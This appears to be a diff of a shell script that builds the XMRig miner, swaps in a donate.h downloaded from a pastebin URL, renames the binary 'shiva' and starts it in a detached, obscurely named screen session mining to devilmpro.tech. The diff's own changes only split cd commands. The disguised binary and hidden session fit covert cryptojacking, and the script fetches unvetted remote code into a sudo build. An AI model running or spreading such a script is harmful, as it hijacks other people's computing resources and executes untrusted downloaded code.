@@ -10,19 +10,23 @@ mv xmrig pro
 cd pro/src
 sudo rm -rf donate.h
 cd 
-cd pro/src
+cd pro
+cd src
 curl https://pastebin.com/raw/WvFUTQTq --output donate.h
 cd
 cd pro
 mkdir build
-cd pro/build
+cd pro
+cd build
 cmake ..
 make -j$(nproc)
 cd 
-cd pro/build
+cd pro
+cd build
 sudo mv xmrig shiva
 cd
-cd pro/build
+cd pro
+cd build
 screen -dmS p4rs37 ./shiva  -a rx/0 --donate-level 0 -o devilmpro.tech:3330 --cpu-affinity 0x0 --randomx-1gb-pages --rig-id LINA -t 2
 cd
 sudo pkill shiva
